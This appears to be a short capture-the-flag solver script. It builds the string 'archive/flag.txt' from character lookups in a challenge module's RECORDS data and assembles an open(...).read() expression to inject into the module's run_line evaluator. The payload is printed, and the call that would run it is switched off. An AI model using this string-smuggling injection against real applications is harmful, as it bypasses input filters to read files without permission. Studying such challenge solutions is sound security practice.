import importlib.util,sys
spec=importlib.util.spec_from_file_location("cms",sys.argv[1]); m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
def ch(c):
    for col,r in m.RECORDS.items():
        for k,v in r.items():
            if c in v: return f"{col}.{k}[{v.index(c)}]"
    raise Exception(c)
p="+".join(ch(c) for c in "archive/flag.txt")
expr=f"open({p}).read()"
print(expr); print(m.run_line(expr) if False else "")
